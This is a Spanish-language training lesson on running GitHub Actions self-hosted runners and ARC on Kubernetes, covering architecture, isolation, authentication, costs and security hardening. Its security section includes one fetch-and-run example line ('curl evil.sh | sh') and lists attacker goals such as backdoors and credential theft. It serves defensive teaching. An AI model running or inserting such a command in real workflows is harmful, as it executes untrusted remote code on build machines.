# Lección: Self-hosted runners y ARC

> **ID:** `gha-10-self-hosted-runners-and-arc` · **Nivel:** avanzado · **Duración:** 6 h
> **Prerrequisitos:** `gha-01`, `gha-05`, Kubernetes básico.

---

## 1. Introducción intuitiva

Vas a producción con GitHub Actions y aparece una de estas tres frases: *"los runners hosted son muy lentos para nuestros builds"*, *"necesitamos acceso a la VPC privada para desplegar"*, o *"la factura de Actions se nos fue a USD 8.000/mes"*. Las tres te empujan al mismo lugar: **correr tu propio runner**.

Un runner no es magia. Es un **binario Go** (`Runner.Listener`) que:

1. Se autentica contra GitHub.
2. **Hace long-polling** a la API pidiendo "¿tienes trabajo para mí?".
3. Cuando GitHub le entrega un job, baja el workflow, ejecuta los steps y streamea logs de vuelta.
4. Reporta `success`/`failure`.

Es decir: GitHub **no inicia conexiones** hacia ti. Es el runner quien marca. Esto evita que tengas que abrir puertos entrantes, y es lo que hace factible correrlos **dentro de una VPC privada**.

Pero "mi propio runner" trae problemas que GitHub-hosted te resolvía sin que lo supieras: aislamiento, limpieza entre jobs, actualización del binario, escalado bajo carga, seguridad frente a workflows adversarios. **ARC** (Actions Runner Controller) es la respuesta oficial a todo eso cuando corres sobre Kubernetes: cada job se ejecuta en un **pod efímero** creado on-demand, que muere al terminar.

Este módulo te enseña el modelo mental, la operación mínima y las trampas de seguridad — en particular, la regla dura que debes memorizar hoy: **nunca uses self-hosted en un repo público sin un aislamiento fuerte**.

---

## 2. Fundamentos

### 2.1 Qué es exactamente un runner

El runner es software open source (`actions/runner`). Un release es un tarball por SO/arquitectura:

```
actions-runner-linux-x64-2.317.0.tar.gz
├── bin/
│   ├── Runner.Listener        # proceso principal (long-polling + dispatch)
│   ├── Runner.Worker          # proceso efímero por job (ejecuta steps)
│   └── RunnerService.sh       # arranque como service
├── config.sh                  # script de registro (genera .runner, .credentials)
├── run.sh                     # arranca el Listener en foreground
└── externals/                 # Node.js embebido para JS actions, git auxiliar
```

Después de ejecutar `config.sh --url <repo> --token <reg-token>` el directorio tiene:

- **`.runner`** — JSON con id, nombre, labels, pool.
- **`.credentials`** y **`.credentials_rsaparams`** — clave privada RSA emitida por GitHub para autenticar el long-polling (no es un PAT; es específica del runner).

A partir de ese momento, `./run.sh` arranca el `Listener`, abre una conexión HTTPS saliente a `*.actions.githubusercontent.com` y queda en polling.

### 2.2 Long-polling: qué significa realmente

Long-polling es "HTTP request que el servidor **retiene** hasta tener algo que devolver, o hasta un timeout". No es WebSocket. No es gRPC streaming. Es un GET que a veces tarda 50 ms y a veces 50 s.

```
runner                                                 github
  │                                                      │
  │  GET /_apis/distributedtask/.../messages?... (HTTPS) │
  │ ───────────────────────────────────────────────────> │
  │                                                      │  (sin jobs → espera)
  │                              ...                     │
  │  ← 200 {"messageType":"PipelineJobEvent", ...}       │
  │ <─────────────────────────────────────────────────── │
  │                                                      │
  │  (ejecuta el job localmente, streamea logs)          │
  │  POST /logs ...                                      │
  │ ───────────────────────────────────────────────────> │
```

Implicaciones prácticas:

- **No necesitas inbound firewall** — tu runner solo abre conexiones salientes a `github.com`, `api.github.com`, `*.actions.githubusercontent.com`, `codeload.github.com` y `*.pkg.github.com` (ver sección 11.1 "Links").
- La latencia para "picar" un job es ~1–5 s en condiciones normales.
- Si el proceso muere, no hay heartbeat: GitHub lo marca `offline` tras un timeout (~1 min).

### 2.3 Por qué los runners deben ser efímeros

Un runner persistente ejecuta el job #1, deja detrás:

- `/home/runner/_work/<repo>/` con el checkout.
- Caches de pip/npm/go en `$HOME`.
- Procesos huérfanos (daemons de dev, `postgres`, agentes mock).
- Variables de entorno exportadas en pasos previos del mismo job si el shell no se recicló.
- **Archivos escritos por el workflow en lugares no limpiados** (`/tmp`, `~/.aws/`, `~/.docker/config.json`).

El job #2 arranca con esa basura. Peor: si el job #2 es de otro repo (mismo runner compartido), **lee** la basura del job #1. Si el job #1 montó credenciales en `~/.aws/credentials`, el job #2 puede leerlas.

Un runner **efímero** se registra con `--ephemeral`, acepta **un único job**, y luego se desregistra y muere. Si corre en un pod, el pod se destruye. Esto es la propiedad que ARC te da gratis.

### 2.4 Runner groups y labels

- **Labels** — etiquetas en el runner (`self-hosted`, `linux`, `x64`, y las custom que añadas: `gpu`, `vpc-prod`, `arm64`…). El workflow pide con `runs-on: [self-hosted, gpu]`.
- **Runner groups** — namespace de runners a nivel org/enterprise. Permiten decir "estos runners solo pueden ser usados por *estos* repos" (allow-list). Es el control de **autorización** del uso: sin groups, cualquier repo de la org puede programar jobs en cualquier runner.

**Patrón mínimo saludable para una org**:

- `default` group: solo repos de confianza interna.
- Groups por equipo o por sensibilidad: `prod-deploy`, `data-platform`, `oss-fork-safe` (vacío de secretos).
- **Ningún** runner self-hosted en un group accesible por repos públicos sin aislamiento.

---

## 3. Contexto histórico

- **2019** — Lanzamiento de Actions: solo hosted.
- **2019-2020** — Soporte de self-hosted runners auto-administrados (binario descargable).
- **2020-2022** — Aparece `summerwind/actions-runner-controller`, operator comunitario para Kubernetes. Muy adoptado.
- **2023** — GitHub **adopta oficialmente** ARC bajo `actions/actions-runner-controller`, con una arquitectura nueva basada en `AutoscalingRunnerSet` y un **listener** separado por scale set. El modelo viejo (`RunnerDeployment` + webhooks) queda deprecated.
- **2023+** — **Larger runners** (hosted con más CPU/RAM, GPU, ARM). Reducen la necesidad de self-hosted *por rendimiento* en muchos casos, pero no cubren el caso de red privada ni el de coste a muy alto volumen.

Hoy, "ARC" significa el oficial de GitHub (CRDs `AutoscalingRunnerSet` + `AutoscalingListener`). Si lees docs viejas que hablan de `RunnerDeployment`, estás en la versión antigua.

---

## 4. Funcionamiento interno

### 4.1 Arquitectura ARC (oficial)

Dos charts separados:

- **`gha-runner-scale-set-controller`** — el **operator** (ClusterRole, CRDs, controller-manager). Uno por cluster.
- **`gha-runner-scale-set`** — un **scale set**: instancia específica apuntando a un repo/org/enterprise. Uno por target. Cada instalación del chart crea:
  - Un `AutoscalingRunnerSet` CR (lo que *tú* defines: imagen, labels, min/max, group).
  - Un `AutoscalingListener` CR (lo *gestiona el operator*: pod que hace long-polling a GitHub).
  - Un `Deployment` de **listener** (1 pod).
  - **Pods runner on-demand** creados por el operator cuando el listener recibe un `JobAssignment`.

```
┌──────────────────────────────────────────────────────────────────────┐
│  Kubernetes cluster                                                   │
│                                                                       │
│   ┌───────────────────────────────┐    ┌───────────────────────────┐  │
│   │  Namespace: arc-systems       │    │ Namespace: arc-runners    │  │
│   │                               │    │                           │  │
│   │  Deployment: arc-controller   │    │  AutoscalingRunnerSet     │  │
│   │   - watches CRDs              │    │     (CR declarativo)      │  │
│   │   - creates listeners         │    │                           │  │
│   │   - creates runner pods       │    │  Deployment: ...-listener │  │
│   │                               │    │     ↓ long-polls          │  │
│   └───────────────────────────────┘    │  Pods: runner-xxx (N on-  │  │
│                                        │   demand, ephemeral)      │  │
│                                        └───────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
          │ outbound HTTPS                               │
          └──────────────────────────────────────────────┘
                         ▼
                    ┌──────────────┐
                    │   GitHub.com │
                    │   (Actions)  │
                    └──────────────┘
```

El flujo:

1. Instalas controller con `helm install arc oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller`.
2. Instalas un scale set con `helm install my-runners oci://.../gha-runner-scale-set --set githubConfigUrl=https://github.com/<org>/<repo> --set githubConfigSecret=<secret>`.
3. El operator crea un pod listener en el namespace del scale set.
4. El listener hace long-polling.
5. Alguien hace `push` con `runs-on: my-runners`.
6. GitHub despacha el job; el listener recibe el mensaje; **el operator crea un pod runner** con la imagen configurada; el runner se registra automáticamente, consume el job, se desregistra, el pod muere.

### 4.2 Autenticación: GitHub App vs PAT

ARC necesita credenciales con permiso para crear registration tokens:

- **PAT** (fine-grained, con `Administration: Read & Write` sobre el repo/org) — fácil para probar, pero expira y es *per-user*.
- **GitHub App** — recomendado para producción. Instalado sobre la org, con permisos **mínimos**:
  - `Administration: Read & Write` (solo si target es repo).
  - `Organization self hosted runners: Read & Write` (si target es org/enterprise).
  - `Actions: Read`.
- Nada más.

El operator renueva *installation tokens* (TTL 1 h) automáticamente. Son short-lived — no son un secreto de larga vida.

### 4.3 Lifecycle de un pod runner

Minimal manifest conceptual (lo genera ARC, no tú):

```
Pod: runner-xxxx
  Containers:
    - runner        # imagen actions-runner oficial o tuya
      env:
        RUNNER_NAME: ...
        RUNNER_SCOPE: repo/org
        REG_TOKEN: ...        # inyectado por el listener
      command: config.sh ... && run.sh --ephemeral --once
  RestartPolicy: Never
```

Al terminar el único job, el proceso sale y el pod va a `Completed`. ARC lo elimina después de un corto período.

### 4.4 Scale-from-zero

El `AutoscalingRunnerSet` tiene `minRunners: 0` y `maxRunners: N`. Si no hay jobs encolados, **cero pods runner** corren (solo el listener, muy liviano). Pagas solo compute cuando hay trabajo. Comparado con VMs 24/7 esto cambia la economía.

Trade-off: latencia de **cold start** (pull de imagen + `config.sh` + registro) añade 10–40 s al tiempo "del `push` al primer step" vs un runner caliente. Mitigaciones: `minRunners: 1-2` warm, imágenes pre-cacheadas en los nodos (DaemonSet de preload), nodos con imágenes ya tiradas.

### 4.5 Permisos del runner dentro del pod

**Por default** el pod runner no es privilegiado. Si tus workflows usan `docker build` necesitas o bien:

- **DinD** (docker-in-docker, sidecar privilegiado) — simple, pero compromete el aislamiento.
- **Kaniko / BuildKit rootless** — construye imágenes sin docker ni root.
- **Buildah** rootless.

La elección depende de tu threat model.

---

## 5. Seguridad: la regla dura y por qué

> **No ejecutes workflows de repos públicos en runners self-hosted sin aislamiento fuerte.**
> Lo dice la [documentación oficial de GitHub](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security) de forma literal: *"We recommend that you only use self-hosted runners with private repositories."*

### 5.1 Por qué

Cualquier persona puede abrir un PR a tu repo público. El workflow que corre sobre ese PR **puede ejecutar código arbitrario** (`run: curl evil.sh | sh`, un script en el repo, una action de terceros maliciosa, una modificación al propio workflow en PRs no reviewed). Si ese código corre en **tu** máquina self-hosted:

- Puede leer secretos de otros jobs que esa máquina ejecutó.
- Puede plantar backdoors persistentes (en `.bashrc`, `cron`, systemd units) que infecten jobs futuros.
- Puede atacar la red interna si el runner está en tu VPC.
- Puede minar crypto hasta que lo notes en la factura.
- Puede exfiltrar cualquier cosa a la que el runner tenga acceso en el filesystem (credenciales de cloud, llaves SSH, docker socket, kubeconfig).

En hosted esto no es tu problema porque GitHub destruye la VM al terminar.

### 5.2 Si realmente *tienes* que hacerlo

Lo correcto es decir "no" y usar hosted/larger. Si por alguna razón de peso debes:

1. **Runners efímeros obligatorios** (ARC con `--ephemeral`, pod destruido tras cada job).
2. **Approval requerido para workflows de forks** (setting a nivel repo: *"Require approval for first-time contributors / all outside collaborators"*).
3. **Runner group aislado** con allow-list explícita (si el repo público puede usarlos, lo restringes).
4. **Sin secrets accesibles** (ningún secret del repo expuesto a workflows de PR; usar environment protection rules).
5. **Red segmentada** — el pod runner en un namespace/subnet sin acceso a servicios internos.
6. **Egress firewall** — allowlist solo GitHub + registries necesarios.
7. **Pin de todas las actions a SHA** (ver `gha-04`).

Y aun así, es menos seguro que hosted.

### 5.3 Riesgos adicionales incluso en repos privados

- **Collaborator malicioso** o cuenta comprometida — tiene permiso de push y por tanto de ejecutar workflows en tu runner.
- **Dependencias comprometidas** (una action de tercero sin pin que un día empieza a exfiltrar).
- **Pod escape** si el runner privilegiado o DinD tiene bugs.
- **Secretos cross-job** si el runner no es efímero (ver 2.3).

Mitigaciones son las mismas de `gha-13`: permisos mínimos, pin a SHA, approvals, segmentación.

---

## 6. ARC: hands-on mental model

Antes de instalar, memoriza:

1. **Dos charts, no uno.** Operator (una vez) + scale sets (uno por target).
2. **Un `Secret` por scale set** con la credencial (PAT o GitHub App key).
3. **CRDs** instalados por el operator; verifica con `kubectl get crd | grep actions.github.com`:
   - `autoscalingrunnersets.actions.github.com`
   - `autoscalinglisteners.actions.github.com`
   - `ephemeralrunners.actions.github.com`
   - `ephemeralrunnersets.actions.github.com`
4. **`runs-on: <nombre-del-release-del-scale-set>`** — ARC usa el nombre de la instalación de Helm como label en lugar de añadir "self-hosted".

Minimal `values.yaml` para `gha-runner-scale-set`:

```yaml
githubConfigUrl: "https://github.com/myorg/myrepo"
githubConfigSecret: "pre-defined-github-secret"   # Secret con github_token=<PAT>
minRunners: 0
maxRunners: 5
runnerGroup: "default"
```

Y en el workflow:

```yaml
jobs:
  build:
    runs-on: my-runners   # == <release-name> del scale set
    steps:
      - uses: actions/checkout@v4
      - run: echo "hola desde ARC"
```

Eso es todo. Desde el POV del workflow autor, no hay diferencia con hosted.

---

## 7. Hosted vs self-hosted vs ARC vs larger runners

| Dimensión | GitHub-hosted (default) | Larger runners (hosted) | Self-hosted (VM/baremetal) | ARC (K8s) |
|-----------|-------------------------|-------------------------|----------------------------|-----------|
| **Operación** | Cero | Cero | Alta (patches, imágenes, update del binario) | Media (operar K8s + ARC) |
| **Coste a volumen alto** | Lineal, caro | Más caro aún | Barato si usas la máquina | Muy barato (scale-from-zero) |
| **Latencia de cold start** | ~5 s | ~5 s | 0 (siempre caliente) | 10–40 s |
| **Acceso a red privada** | No | No (salvo "private networking", limitado) | Sí | Sí |
| **GPU / HW especial** | Limitado | Mejor | Total | Total (nodos con GPU) |
| **Seguridad por default** | Alta (VM efímera, aislada) | Alta | Baja (persistente, compartido) | Media-alta (pod efímero) si bien configurado |
| **OSS / repo público** | Correcto | Correcto | **No** | **No** (salvo aislamiento fuerte) |
| **Escalado automático** | Infinito (desde tu POV) | Infinito | Manual o custom | Nativo (0..N) |

**Regla de dedo**:

- Repo público → **hosted siempre**.
- Repo privado estándar → **hosted** hasta que la factura o la latencia duelan.
- Builds muy pesados → **larger runners** primero (porque es cero operación), luego ARC si el coste no cuadra.
- Necesidad de red privada → ARC o self-hosted (no hay alternativa).
- Equipo que ya opera K8s → ARC es muy natural.
- Equipo que *no* opera K8s → no te metas con ARC solo "por el coste"; el TCO sorprende.

---

## 8. ADR template para "¿qué runner uso?"

```markdown
# ADR: Elección de infraestructura de runners para <proyecto>

## Contexto
- Visibilidad del repo: <public|private>
- Volumen de minutos/mes estimado: ...
- Builds requieren GPU / RAM > 16 GB: ...
- Deploy requiere acceso a VPC privada: ...
- Equipo opera K8s: sí/no
- Threat model: código no confiable puede entrar al runner: sí/no

## Opciones evaluadas
1. GitHub-hosted estándar
2. GitHub-hosted larger
3. Self-hosted VMs
4. ARC en K8s

## Decisión
Elegimos <X> porque <...>.

## Consecuencias
- Operación: ...
- Coste estimado: ...
- Riesgos: ...
- Plan si crece: ...
```

Este es el formato que te pediremos en `activities/02`.

---

## 9. Problemas comunes y debugging

### 9.1 Runner no "pica" el job

- `Runner.Listener` corriendo? (`ps aux | grep Runner.Listener`)
- Logs del listener: `tail -f _diag/Runner_*.log`.
- Egress a `*.actions.githubusercontent.com` bloqueado por firewall → `curl -v https://api.github.com` desde la máquina.
- Labels mal escritos en `runs-on:` (case-sensitive). Verifica en la UI del repo → *Settings → Actions → Runners*.
- Runner group no permite ese repo (allow-list restrictiva).

### 9.2 Pod runner en `CrashLoopBackOff` (ARC)

- `kubectl logs -n arc-runners <pod>` → busca errores de registro (`Authentication failed`, 401).
- Secret del GitHub App key mal montado o key corrupta.
- `githubConfigUrl` apuntando a repo que no existe o al que la App no está instalada.
- Image pull errors — si usas imagen custom privada, falta `imagePullSecrets`.

### 9.3 Jobs lentos de arrancar (ARC)

- Cold start de la imagen → pre-pull en los nodos.
- `minRunners: 0` deja frío el pool. Sube a `1-2` warm si la latencia duele.
- Nodo con poca memoria → scheduler tarda; revisa requests/limits.

### 9.4 "Job hangs forever"

- El pod runner murió pero GitHub no lo notó aún → esperas al timeout del job.
- `kubectl get pods -n arc-runners` muestra pods en estados raros.
- Operator caído: `kubectl logs -n arc-systems deploy/arc-controller`.

### 9.5 Contaminación entre jobs (self-hosted no efímero)

- Síntoma: tests pasan solos pero fallan en CI; archivos aparecen "ya existentes".
- Causa: `/tmp` o `$HOME` sucio del job anterior.
- Fix verdadero: hacer el runner efímero (ARC o `--ephemeral` + supervisor que re-registra).
- Fix pobre: paso de cleanup al inicio de cada workflow (no es fiable).

---

## 10. Buenas prácticas resumen

- **Nunca** self-hosted para repos públicos sin aislamiento duro.
- Runners **siempre efímeros** si es posible.
- Autenticación por **GitHub App**, no PAT, en producción.
- Permisos mínimos del App.
- Runner **groups** con allow-list explícita por repo.
- Labels descriptivos (`gpu`, `vpc-prod`, `arm64`), nunca "latest" o "fast".
- `minRunners > 0` solo si la latencia duele; mide antes.
- Egress firewall con allowlist a `github.com` + registries.
- Pin de la **imagen del runner** a tag específico (o SHA de imagen); nunca `:latest`.
- Observabilidad: métricas del operator (Prometheus), logs del listener centralizados.
- Documenta el **ADR** de por qué elegiste tu modelo.

---

## 11. Recursos y lecturas

- Docs oficiales: [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners).
- [Communication between self-hosted runners and GitHub](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#communication-between-self-hosted-runners-and-github) — endpoints exactos a abrir en el firewall.
- [ARC quickstart (oficial)](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller).
- Repo: `github.com/actions/actions-runner-controller`.
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions).

---

## 12. Preguntas de evaluación

Responde sin consultar:

1. Describe en 4 pasos qué pasa desde que `./config.sh` termina hasta que el runner "pica" su primer job.
2. ¿Qué significa que el runner haga **long-polling** y por qué permite correr runners detrás de NAT sin abrir puertos entrantes?
3. ¿Por qué un runner **no efímero** compartido entre repos es un riesgo de seguridad concreto, no teórico? Da un escenario de ataque en 3 líneas.
4. Repites la regla dura: *"no uses self-hosted en repos públicos sin aislamiento"*. Explica **por qué**, dando un ataque específico que esto previene.
5. Enumera los dos CRDs principales que ARC instala y qué recurso crea cada uno.
6. ¿Qué diferencia hay entre **GitHub App** y **PAT** como credencial de ARC, y por qué App gana en producción?
7. Un `AutoscalingRunnerSet` con `minRunners: 0, maxRunners: 5` ejecuta un workflow con `runs-on: my-runners`. Describe los 4 eventos que ocurren en orden, desde `git push` hasta que el pod runner termina.
8. Dado un equipo que necesita builds de 60 GB RAM con GPU y acceso a RDS en una VPC privada, ¿qué recomiendas (hosted / larger / self-hosted / ARC) y por qué?
9. Comparas ARC con larger runners por **coste**: ¿qué variable define que ARC gane y en qué variable gana larger?
10. ¿Qué 3 cosas monitorearías de tu instalación de ARC en producción para detectar que algo va mal antes de que se queje el usuario?
